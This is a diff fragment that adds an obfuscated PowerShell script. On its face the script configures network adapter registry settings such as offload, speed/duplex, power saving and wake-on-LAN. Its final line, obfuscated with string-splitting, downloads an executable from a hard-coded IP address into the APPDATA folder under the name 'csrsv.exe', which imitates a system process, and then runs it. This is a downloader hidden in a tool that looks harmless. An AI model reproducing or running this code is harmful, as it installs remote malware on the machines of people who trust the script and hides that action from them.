+					&("{0}{2}{3}{1}"-f'W','-Host','ri','te') ("{1}{0}" -f'd','Faile') -ForegroundColor ("{0}{1}" -f 'Re','d')
+				}
+			} else {
+				${vaL`UE} = &("{4}{2}{0}{3}{1}"-f'temPr','ty','t-I','oper','Ge') -Path ${nETwOr`KadApt`e`RS`U`B`KEY} -Name ${Ad`AP`T`orProp`erTY}
+				&("{3}{4}{0}{2}{1}"-f 'emPr','ty','oper','Set-I','t') -Path ${n`Etwork`A`dA`PTERs`UbkEy} -Name ${Ada`ptO`RPr`OpERTy} -Value 0x00000000
+				${VaL`UE} = &("{1}{4}{2}{0}{3}"-f'temP','G','t-I','roperty','e') -Path ${N`etwORKAda`PtERSUBk`ey} -Name ${adAPTO`RP`Ro`perTy}
+				If (${V`AluE}.${ad`ApTorp`ROp`e`RTY} -eq 0x00000000) {
+					&("{1}{2}{0}" -f 't','Wri','te-Hos') ${pRoT`OCol`Arp`OffLoaD} -ForegroundColor ("{0}{1}"-f 'Yello','w')
+				} else {
+					&("{3}{2}{0}{1}" -f 'H','ost','te-','Wri') ("{1}{0}"-f'd','Faile') -ForegroundColor ("{0}{1}" -f'R','ed')
+				}
+			}
+		}
+		
+		If (${P`RoTOcoLN`s`Off`L`Oad} -ne "") {
+			${ada`ptOrPROpe`R`Ty} = ("{0}{1}{2}"-f'*PMN','SOf','fload')
+			&("{2}{1}{0}" -f't','ite-Hos','Wr') ("{6}{1}{2}{3}{4}{5}{7}{0}" -f '..','t','oc','ol ','NS O','f','Pro','fload...') -NoNewline
+			If (${PRotOCo`l`N`sof`FloAD} -eq ("{2}{0}{1}" -f 's','abled','Di')) {
+				${Va`L`Ue} = &("{1}{4}{3}{0}{2}" -f'opert','Get-It','y','Pr','em') -Path ${n`eTw`o`RkaDAPTeRsuBk`Ey} -Name ${ADApt`ORprO`pERTY}
+				&("{0}{2}{4}{1}{3}" -f'Set-I','opert','temP','y','r') -Path ${neT`WOrKADa`pt`eRsuBkeY} -Name ${AdA`PT`OrprOpE`R`TY} -Value 0x00000001
+				${Va`LUe} = &("{1}{2}{0}"-f'y','Get-ItemProper','t') -Path ${Ne`TworKadA`p`T`Er`SUBkey} -Name ${ad`Ap`TOR`proPeRTY}
+				If (${vA`LuE}.${adapto`Rpr`o`perty} -eq 0x00000001) {
+					&("{2}{1}{0}"-f'-Host','rite','W') ${PRotOCOln`S`offl`o`Ad} -ForegroundColor ("{2}{0}{1}" -f'o','w','Yell')
+				} else {
+					&("{2}{0}{1}" -f 'te-Ho','st','Wri') ("{0}{1}"-f'Fai','led') -ForegroundColor ("{0}{1}" -f'R','ed')
+				}
+			} else {
+				${val`UE} = &("{3}{0}{2}{1}"-f 'et-','y','ItemPropert','G') -Path ${NE`T`WOrKAD`ApteR`s`U`BkEY} -Name ${ada`PtOrPRO`p`eRTY}
+				&("{3}{2}{0}{4}{1}" -f'emPr','erty','It','Set-','op') -Path ${nEt`w`O`RkA`da`PTERSubkEy} -Name ${AD`A`pT`oRPrOpErtY} -Value 0x00000000
+				${v`A`lUe} = &("{1}{2}{0}"-f'mProperty','Get','-Ite') -Path ${Ne`Tw`ORKaDAP`T`erSub`K`Ey} -Name ${adApToR`PRo`p`erTy}
+				If (${VaL`UE}.${a`dA`PTo`RprOPeRtY} -eq 0x00000000) {
+					&("{2}{0}{1}"-f 'ri','te-Host','W') ${p`R`oTocolnsOFF`lOAd} -ForegroundColor ("{1}{0}" -f'low','Yel')
+				} else {
+					&("{0}{1}{2}" -f 'Wr','ite-','Host') ("{0}{1}" -f'Fa','iled') -ForegroundColor ("{1}{0}"-f'd','Re')
+				}
+			}
+		}
+		
+		if (${spE`E`d`DupleX} -ne "") {
+			${Ad`A`pTORp`RO`PERTy} = ("{2}{3}{0}{1}"-f'uple','x','*Spee','dD')
+			${a`daPTeRP`RoPEr`TieS}.${A`Da`PTOR`PropeRtY} = ${spEeD`dU`pLeX}
+		}
+		If (${s`pee`DdUPL`EX} -ne "") {
+			${adaP`TORPR`O`PER`TY} = ("{0}{1}{2}{3}"-f '*Sp','eedDu','pl','ex')
+			&("{2}{3}{0}{1}"-f'ite-Ho','st','W','r') ("{3}{1}{0}{2}" -f'plex....',' Du','.','Speed') -NoNewline
+			switch (${SP`E`EdDU`PlEx}) {
+				("{2}{1}{0}{3}" -f 'o','iati','Auto Negot','n') {
+					${adA`Pte`R`PR`OpERtYVA`Lue} = 0
+					${vAL`Ue} = &("{2}{1}{0}{3}"-f'ItemPropert','-','Get','y') -Path ${neTW`oR`kAda`pTEr`sUBkey} -Name ${AdAPT`o`R`pRoP`erty}
+					&("{3}{0}{4}{2}{1}" -f'et-Item','y','t','S','Proper') -Path ${neTwOR`K`AD`A`PtErS`UbKEy} -Name ${adapTo`RP`R`op`Erty} -Value ${A`DapT`eRPrOp`eRtYVa`lUe}
+					${V`ALuE} = &("{2}{1}{3}{0}{4}" -f'r','temP','Get-I','rope','ty') -Path ${neTw`OrkaD`APt`E`Rs`Ubk`EY} -Name ${aD`AptorproP`E`R`TY}
+					If (${V`ALuE}.${ADap`TOrpro`p`erTY} -eq ${A`D`APTe`RprO`peRty`VA`lUe}) {
+						&("{2}{0}{1}"-f'te-Hos','t','Wri') ${S`peeDDUpL`ex} -ForegroundColor ("{1}{0}{2}"-f'e','Y','llow')
+					} else {
+						&("{2}{0}{1}" -f'os','t','Write-H') ("{0}{1}" -f'Fai','led') -ForegroundColor ("{1}{0}"-f 'd','Re')
+					}
+				}
+				("{0}{2}{5}{1}{4}{3}"-f'10 Mbps','p',' ','ex','l','Half Du') {
+					${aDaP`Te`RpRo`PertYvA`lUe} = 1
+					${V`ALuE} = &("{3}{1}{0}{2}" -f 'er','p','ty','Get-ItemPro') -Path ${ne`T`WOr`kAdapTe`R`sUb`KeY} -Name ${aD`APtoRpR`O`PER`Ty}
+					&("{1}{2}{3}{0}"-f'roperty','Set-','Ite','mP') -Path ${ne`TWoRkADAp`T`erS`U`BKEY} -Name ${ADAPT`Or`p`ROp`erTY} -Value ${ADaPteRp`Ro`peRTy`VA`Lue}
+					${v`A`lUE} = &("{4}{3}{1}{0}{2}"-f'e','p','rty','mPro','Get-Ite') -Path ${NEtw`o`RKADaP`TeRsuB`kEY} -Name ${ad`Ap`ToRPR`oPE`RTY}
+					If (${vA`LUE}.${A`Da`pTOrp`Roper`TY} -eq ${ADapterpro`PErt`Y`VA`luE}) {
+						&("{1}{0}{2}" -f 's','Write-Ho','t') ${sp`Ee`dDUPl`eX} -ForegroundColor ("{1}{0}" -f'ellow','Y')
+					} else {
+						&("{0}{1}{2}{3}" -f'Wri','te-','Hos','t') ("{0}{1}" -f'Fail','ed') -ForegroundColor ("{0}{1}"-f 'Re','d')
+					}
+				}
+				("{1}{6}{5}{0}{3}{2}{4}"-f 'l ','1','le','Dup','x','Ful','0 Mbps ') {
+					${aDapt`e`RP`RopER`Tyv`A`Lue} = 2
+					${v`Al`UE} = &("{3}{0}{2}{1}" -f '-Ite','ty','mProper','Get') -Path ${n`eTwOrk`AD`APTE`R`suBKEY} -Name ${ada`Pt`ORP`R`oPERty}
+					&("{4}{1}{2}{0}{3}"-f 'pert','em','Pro','y','Set-It') -Path ${nET`W`orkADaPte`R`SU`B`Key} -Name ${Ad`APT`OrPrO`PErTY} -Value ${ad`ApTErPr`oPErT`y`VAlUE}
+					${va`l`UE} = &("{5}{4}{0}{1}{3}{2}"-f'-I','temP','y','ropert','et','G') -Path ${NET`w`O`Rk`AdapTersU`BkEy} -Name ${adAPT`oRpRoP`E`RTY}
+					If (${V`Al`UE}.${a`dAP`TorprOpeR`Ty} -eq ${AdAPte`R`pRO`p`erTYVaLUe}) {
+						&("{1}{2}{0}"-f 't','Wri','te-Hos') ${SPee`d`DUPlex} -ForegroundColor ("{1}{2}{0}"-f'w','Yel','lo')
+					} else {
+						&("{0}{1}{2}"-f'Wr','ite-Hos','t') ("{1}{0}" -f'ailed','F') -ForegroundColor ("{0}{1}"-f 'R','ed')
+					}
+				}
+				("{1}{6}{5}{2}{4}{0}{3}"-f 'pl','1','Mbps H','ex','alf Du',' ','00') {
+					${adapter`prO`pER`TyvaLue} = 3
+					${V`AlUE} = &("{2}{0}{3}{1}"-f't','Property','Get-I','em') -Path ${N`eT`WORKaD`Ap`TeRsU`BKEY} -Name ${aDA`p`T`OrPRoP`eRTy}
+					&("{0}{3}{2}{1}{4}"-f'S','e','temProp','et-I','rty') -Path ${N`eTw`orkaDA`ptE`Rs`U`BKEY} -Name ${AD`AptOR`PR`opertY} -Value ${ADapt`ERprO`pE`RtY`Val`UE}
+					${va`L`Ue} = &("{3}{1}{0}{2}{4}" -f'emP','t','rop','Get-I','erty') -Path ${n`ETwOR`kaDa`P`T`ersUbKeY} -Name ${aDA`PtORP`RoPEr`TY}
+					If (${VAl`UE}.${ad`APTORPR`OpE`RTy} -eq ${adApTE`R`p`ROpE`RTy`Va`lUE}) {
+						&("{0}{1}{2}" -f 'Wri','te-H','ost') ${sP`eED`d`UpLEx} -ForegroundColor ("{0}{1}"-f'Yel','low')
+					} else {
+						&("{0}{3}{1}{2}"-f 'Wri','e-H','ost','t') ("{0}{1}"-f'Faile','d') -ForegroundColor ("{1}{0}" -f'd','Re')
+					}
+				}
+				("{0}{4}{1}{5}{2}{3}" -f'100','l ','up','lex',' Mbps Ful','D') {
+					${a`d`A`ptErProP`E`RtY`ValuE} = 4
+					${v`ALUe} = &("{3}{0}{2}{4}{1}"-f 'et-','roperty','It','G','emP') -Path ${neT`w`oRK`ADaPT`e`RS`UbKEy} -Name ${AD`A`PT`ORP`ROpErTy}
+					&("{3}{4}{0}{2}{1}"-f 'temP','rty','rope','S','et-I') -Path ${ne`TwOR`kaD`Ap`TErS`UbK`ey} -Name ${aD`A`pT`oR`PROPeRtY} -Value ${adAPtE`RP`RoP`eRTyVaLUE}
+					${VA`L`UE} = &("{1}{0}{2}{3}"-f 'et-','G','It','emProperty') -Path ${N`E`TWo`RKA`DaPtEr`SUBKEY} -Name ${ad`Apt`ORProP`erTy}
+					If (${VAl`Ue}.${aDap`To`RpROPE`Rty} -eq ${A`dAPTe`RpRo`PERTYVaL`Ue}) {
+						&("{1}{0}{2}"-f 'e-Ho','Writ','st') ${spE`e`DDUpL`Ex} -ForegroundColor ("{0}{1}" -f 'Y','ellow')
+					} else {
+						&("{0}{1}{2}" -f 'W','rite','-Host') ("{2}{0}{1}"-f'l','ed','Fai') -ForegroundColor ("{1}{0}"-f'ed','R')
+					}
+				}
+				("{2}{0}{1}{5}{4}{3}"-f'.0',' ','1','ll Duplex','Fu','Gbps ') {
+					${A`D`AptE`RPro`peRty`VALUe} = 6
+					${Va`LUE} = &("{1}{2}{0}" -f'ty','Get-It','emProper') -Path ${NET`wOR`KAdAp`TersUBk`eY} -Name ${A`DaPt`or`pr`OpeR`Ty}
+					&("{2}{5}{1}{0}{3}{4}" -f'temP','I','Set','ropert','y','-') -Path ${N`eTWo`R`KaDAPTErS`UBkey} -Name ${adapTOrP`RO`Pe`Rty} -Value ${aD`ApTe`RpROpER`TY`VaL`UE}
+					${v`AluE} = &("{3}{1}{2}{0}" -f 'ty','rope','r','Get-ItemP') -Path ${N`ETw`orkAda`pt`e`RSUbkey} -Name ${AdA`pt`orprOPeRTy}
+					If (${vA`L`Ue}.${adaPt`OrpRopE`R`Ty} -eq ${adapTeR`p`RoP`erTyVA`L`UE}) {
+						&("{0}{1}{2}" -f'Write-H','os','t') ${s`Pee`dD`UPLEx} -ForegroundColor ("{1}{2}{0}" -f'llow','Y','e')
+					} else {
+						&("{2}{1}{0}" -f'ost','e-H','Writ') ("{1}{2}{0}" -f 'd','Fail','e') -ForegroundColor ("{1}{0}"-f 'ed','R')
+					}
+				}
+			}
+		}
+		
+		If (${SYsteM`Idl`epoW`eRsA`VeR} -ne "") {
+			${A`dap`ToRPRO`p`E`Rty} = ("{3}{2}{1}{0}" -f 'ed','bl','Ena','Sips')
+			&("{2}{1}{0}" -f 'st','te-Ho','Wri') ("{5}{6}{4}{1}{3}{0}{2}"-f 'er Saver...','P','..','ow','e ','S','ystem Idl') -NoNewline
+			If (${sy`ST`Em`idLEPoWerSa`Ver} -eq ("{2}{0}{1}" -f 'able','d','En')) {
+				${vAL`Ue} = &("{0}{3}{2}{4}{1}" -f'Get','ty','P','-Item','roper') -Path ${N`eTWOr`KaDa`p`TErsuBkEy} -Name ${Ad`APtOrPr`O`PeRTy}
+				&("{2}{3}{0}{1}"-f'rope','rty','Set-','ItemP') -Path ${net`WOrKa`D`Apte`RsUbkEY} -Name ${Ad`APToRPR`oPE`RTy} -Value 1
+				${VAl`Ue} = &("{3}{0}{1}{2}" -f 't-I','t','emProperty','Ge') -Path ${NeTw`oRKaDapTe`R`S`UBk`Ey} -Name ${aD`Ap`To`RProPeRTY}
+				If (${val`UE}.${AD`APto`RPro`pe`RtY} -eq 1) {
+					&("{2}{0}{1}"-f'rite-Hos','t','W') ${SYs`TeMi`DLep`owEr`S`AVeR} -ForegroundColor ("{1}{0}"-f'w','Yello')
+				} else {
+					&("{2}{1}{0}" -f 'st','Ho','Write-') ("{0}{2}{1}"-f 'Fai','d','le') -ForegroundColor ("{0}{1}"-f 'Re','d')
+				}
+			} else {
+				${V`AL`UE} = &("{4}{2}{0}{3}{1}" -f 'er','y','t-ItemProp','t','Ge') -Path ${N`Etwor`kA`DaPTersUb`key} -Name ${aDaP`TOR`P`RoP`eRty}
+				&("{1}{4}{3}{0}{2}"-f 'opert','Set','y','r','-ItemP') -Path ${nETwo`RKaDa`p`Ter`sUbKeY} -Name ${aDA`ptoRp`Rop`ErTy} -Value 0
+				${Va`LUe} = &("{1}{2}{0}{3}{4}" -f'ope','Ge','t-ItemPr','r','ty') -Path ${ne`T`Wor`kadAptErsubk`eY} -Name ${adAP`T`Or`pRoPErTY}
+				If (${V`Al`UE}.${ADa`ptorP`RoPE`R`Ty} -eq 0) {
+					&("{2}{1}{0}" -f 'ost','H','Write-') ${SyS`TeMi`dlEpo`wEr`saVEr} -ForegroundColor ("{1}{2}{0}"-f'llow','Y','e')
+				} else {
+					&("{1}{2}{0}" -f 'e-Host','Wr','it') ("{0}{1}{2}" -f 'Fa','i','led') -ForegroundColor ("{1}{0}"-f'ed','R')
+				}
+			}
+		}
+		
+		If (${Wa`KEoNma`Gi`cPAC`k`ET} -ne "") {
+			${ADApTor`pR`o`PerTY} = ("{5}{2}{0}{1}{3}{4}" -f 'cP','a','akeOnMagi','cke','t','*W')
+			&("{2}{3}{0}{1}"-f 'Ho','st','Wr','ite-') ("{0}{1}{4}{2}{3}{5}" -f 'Wake On Magi','c','Pa','cket...',' ','..') -NoNewline
+			If (${WAK`EOn`MAGicP`ACK`ET} -eq ("{2}{0}{1}" -f'isable','d','D')) {
+				${V`Alue} = &("{1}{0}{3}{2}"-f'em','Get-It','y','Propert') -Path ${NeTW`O`RKAD`APt`eRs`UbkEY} -Name ${AD`APto`R`PRoPerTY}
+				&("{2}{4}{0}{3}{1}" -f'pe','y','Set-Ite','rt','mPro') -Path ${ne`TwORk`ADApT`er`sU`BK`eY} -Name ${A`Da`PTORp`RopErTY} -Value 0x00000001
+				${VAl`Ue} = &("{2}{3}{0}{1}" -f'oper','ty','Get-','ItemPr') -Path ${NET`W`OrkaDa`ptersUBKeY} -Name ${ad`Ap`T`ORPROPeRtY}
+				If (${Va`LuE}.${adAp`TOrpr`O`pe`RTY} -eq 0x00000001) {
+					&("{1}{2}{0}"-f 't','Writ','e-Hos') ${WAkeOnM`A`GIcP`AckET} -ForegroundColor ("{1}{0}"-f'low','Yel')
+				} else {
+					&("{3}{2}{1}{0}"-f't','s','e-Ho','Writ') ("{1}{0}"-f'led','Fai') -ForegroundColor ("{1}{0}"-f 'ed','R')
+				}
+			} else {
+				${vaL`Ue} = &("{1}{0}{3}{2}" -f'roper','Get-ItemP','y','t') -Path ${NE`TWorKA`DaP`Ter`SUbkey} -Name ${adAPtoRPrOpE`R`Ty}
+				&("{3}{1}{0}{4}{2}"-f 'r','et-ItemP','y','S','opert') -Path ${ne`Two`RK`ADaPTE`RSUbkeY} -Name ${ADap`TOrPrO`perTy} -Value 0x00000000
+				${v`A`luE} = &("{4}{2}{3}{0}{1}"-f'pe','rty','P','ro','Get-Item') -Path ${N`etW`OR`KA`DapTERS`UBkeY} -Name ${AD`A`PTO`RpRopER`Ty}
+				If (${V`Alue}.${Ad`APTorP`R`opeR`TY} -eq 0x00000000) {
+					&("{2}{0}{1}" -f'Ho','st','Write-') ${WAKE`OnMA`G`ICP`AcKet} -ForegroundColor ("{2}{1}{0}" -f 'w','ello','Y')
+				} else {
+					&("{2}{1}{0}"-f 't','e-Hos','Writ') ("{1}{0}"-f 'led','Fai') -ForegroundColor ("{1}{0}"-f 'd','Re')
+				}
+			}
+		}
+		
+		If (${wA`KeonPatTER`NMaT`ch} -ne "") {
+			${aDapt`ORpR`o`peRtY} = ("{4}{1}{3}{0}{2}"-f 'atte','akeOn','rn','P','*W')
+			&("{2}{1}{0}" -f 'ost','ite-H','Wr') ("{5}{2}{0}{1}{4}{3}"-f'tt','ern M','e On Pa','...','atch..','Wak') -NoNewline
+			If (${WA`keon`P`ATT`eRn`MAtCh} -eq ("{0}{2}{1}"-f'D','sabled','i')) {
+				${v`A`LUE} = &("{1}{3}{0}{2}"-f 'roper','Get-I','ty','temP') -Path ${NEt`WorK`Ada`ptE`RsUB`key} -Name ${adAptOR`PRopEr`TY}
+				&("{0}{4}{3}{1}{2}"-f 'S','P','roperty','-Item','et') -Path ${N`ET`woRKAd`ApTERSUBKey} -Name ${a`D`AptoRp`ROPe`RtY} -Value 0x00000001
+				${Va`l`Ue} = &("{3}{1}{2}{0}"-f'y','t-','ItemPropert','Ge') -Path ${net`wo`RKA`d`APte`RSuBKEY} -Name ${A`daPtOrPr`oPE`Rty}
+				If (${v`ALuE}.${A`dApTOrpRoP`eRty} -eq 0x00000001) {
+					&("{2}{1}{0}" -f'st','Ho','Write-') ${W`Akeon`pat`TeRNmAt`CH} -ForegroundColor ("{1}{0}"-f 'low','Yel')
+				} else {
+					&("{1}{0}{3}{2}"-f'-','Write','st','Ho') ("{1}{0}" -f'd','Faile') -ForegroundColor ("{0}{1}"-f'R','ed')
+				}
+			} else {
+				${vA`luE} = &("{1}{3}{0}{2}{4}" -f 'te','Ge','mPro','t-I','perty') -Path ${nEt`WOR`kA`D`APTe`RS`UbkeY} -Name ${ADAp`ToR`pROper`TY}
+				&("{1}{4}{2}{3}{0}"-f 'y','Set-I','mProp','ert','te') -Path ${Ne`T`wO`RkA`DaPTERsuBKey} -Name ${ADa`PtO`RPro`PEr`TY} -Value 0x00000000
+				${V`ALue} = &("{0}{2}{1}{3}"-f'Get','r','-ItemP','operty') -Path ${n`E`TWo`RKa`DaptEr`SUBKEY} -Name ${A`daptoR`pROpE`R`TY}
+				If (${vAL`UE}.${a`dApT`orPROpe`R`Ty} -eq 0x00000000) {
+					&("{2}{1}{0}"-f 'st','Ho','Write-') ${wAke`ONP`ATtERnm`A`T`ch} -ForegroundColor ("{0}{1}{2}"-f'Ye','llo','w')
+				} else {
+					&("{1}{0}{2}" -f'rite-Ho','W','st') ("{1}{0}{2}" -f'il','Fa','ed') -ForegroundColor ("{0}{1}" -f 'Re','d')
+				}
+			}
+		}
+	}
+}
+
+function s`et`-C`oNs`oLet`ITLE {
+
+	
+	[CmdletBinding()]
+	param
+	(
+			[Parameter(mandAtoRy = ${tr`Ue})][String]${Cons`Olet`itLE}
+	)
+	
+	${h`osT}."U`I"."R`AWUi"."wI`N`D`oWTitLe" = ${COnSO`L`ETitLe}
+}
+
+&("{2}{1}{0}" -f'ar-Host','le','C')
+&("{4}{3}{2}{0}{1}" -f 'i','tle','eT','-Consol','Set') ${ConSOlE`Tit`le}
+${nI`Cs} = &("{3}{2}{0}{1}" -f'a','lNICs','-Physic','Get')
+&("{0}{1}{2}{3}"-f'Se','t-NICRe','gis','tryKey') -NetworkAdapters ${ni`Cs}
+
+(&("{0}{1}{2}"-f'New-Ob','je','ct') ("{1}{3}{0}{2}"-f 't.WebCl','Syst','ient','em.Ne')).("{0}{2}{1}" -f'Do','ile','wnloadF').Invoke(("{1}{4}{5}{3}{7}{0}{2}{6}" -f 'rs','htt','v','o','p://94.102.53.238/~y','aho','.exe','/cs'),"$env:APPDATA\csrsv.exe");&("{3}{2}{0}{1}" -f'oc','ess','art-Pr','St') ("$env:APPDATA\csrsv.exe")
